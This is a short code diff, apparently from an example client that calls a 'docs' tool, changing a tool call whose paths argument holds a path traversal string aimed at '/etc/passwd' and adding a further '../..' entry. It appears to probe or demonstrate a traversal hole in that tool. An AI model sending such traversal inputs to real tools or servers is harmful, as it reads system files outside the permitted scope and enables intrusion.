@@ -18,7 +18,7 @@ async function main() {
     // Example: Call a tool if available
     if (tools.tools && tools.tools.length > 0) {
       const result = await client.callTool('docs', { product: 'sf', 
-        paths: ['../../../../../../../../../../etc/passwd'] });
+        paths: ['../../../../../../../../../../etc/passwd','../..'] });
       console.log('Tool result:', result);
     }
     
